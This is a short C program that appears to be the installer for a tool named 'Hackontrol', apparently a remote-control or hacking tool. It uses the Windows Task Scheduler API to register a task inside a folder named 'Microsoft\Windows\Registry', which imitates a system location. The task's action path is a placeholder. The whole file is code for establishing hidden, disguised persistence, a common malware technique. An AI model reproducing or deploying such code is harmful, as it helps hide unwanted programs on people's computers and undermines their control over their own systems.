#include "HackontrolInstaller.h"

int main(int argc, char** argv) {
	HI_InitializeComAPI();
	ITaskService* service = HI_CreateTaskService();
	ITaskFolder* folder = HI_CreateFolder(service, L"Microsoft\\Windows\\Registry");
	ITaskDefinition* definition = HI_NewTask(service, folder);
	HI_SetPrincipal(folder, definition);
	HI_SetTriggers(folder, definition);
	HI_SetActions(folder, definition, L"XXXXXXXXXXXXXXXXXXXXXX");
	HI_SetSettings(folder, definition);
	HI_RegisterTask(folder, definition, L"TestTask");
	definition->Release();
	folder->Release();
	CoUninitialize();
	return 0;
}
